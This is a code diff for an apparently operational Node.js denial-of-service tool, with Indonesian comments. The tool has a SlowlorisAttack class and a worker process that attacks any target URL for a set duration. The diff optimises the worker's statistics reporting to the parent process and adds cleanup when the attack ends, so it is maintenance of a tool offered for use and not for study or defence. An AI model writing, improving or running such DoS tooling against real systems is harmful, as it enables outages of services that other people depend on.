@@ -411,7 +411,7 @@ class SlowlorisAttack {
             agent: this.agent,
         };
 
-        let intervalId;
+        let timeoutId;
         const req = this.protocol.request(options);
 
         req.on('error', (err) => {
@@ -719,18 +719,33 @@ process.on('message', async ({ targetUrl, duration }) => {
 
     const stats = { total: 0, success: 0, failed: 0, phase: 'Combined Attack' };
 
-    // Kirim statistik ke proses induk setiap detik
-    setInterval(() => {
+    // --- Sistem Pelaporan Statistik yang Dioptimalkan ---
+    // Mengirim statistik secara berkala tanpa membebani IPC (Inter-Process Communication)
+    // untuk mencegah kelambatan pada sistem monitoring.
+    const STATS_INTERVAL = 2000; // Kirim data setiap 2 detik untuk mengurangi beban
+    let statsTimeout;
+
+    const sendStats = () => {
         if (stats.total > 0 || stats.success > 0 || stats.failed > 0) {
-            if (process.send) { // Pastikan proses induk masih ada
-                process.send({ type: 'stats', data: { ...stats } });
+            try {
+                if (process.send) { // Pastikan proses induk masih ada
+                    process.send({ type: 'stats', data: { ...stats } });
+                }
+            } catch (e) {
+                // Proses induk mungkin terputus, hentikan pengiriman statistik
+                if (statsTimeout) clearTimeout(statsTimeout);
+                return;
             }
-            // Reset penghitung setelah mengirim
+            // Reset penghitung setelah berhasil mengirim
             stats.total = 0;
             stats.success = 0;
             stats.failed = 0;
         }
-    }, 1000);
+        // Jadwalkan pengiriman berikutnya
+        statsTimeout = setTimeout(sendStats, STATS_INTERVAL);
+    };
+
+    sendStats(); // Mulai loop pelaporan statistik
 
     const totalDurationMs = duration * 1000;
     const attackers = [];
@@ -755,5 +770,12 @@ process.on('message', async ({ targetUrl, duration }) => {
         attackers.forEach(attacker => {
             if (attacker) attacker.stop();
         });
+        // Hentikan loop statistik saat serangan selesai
+        if (statsTimeout) clearTimeout(statsTimeout);
     }, totalDurationMs);
+
+    // Hentikan loop statistik jika proses diputuskan oleh induk
+    process.on('disconnect', () => {
+        if (statsTimeout) clearTimeout(statsTimeout);
+    });
 });
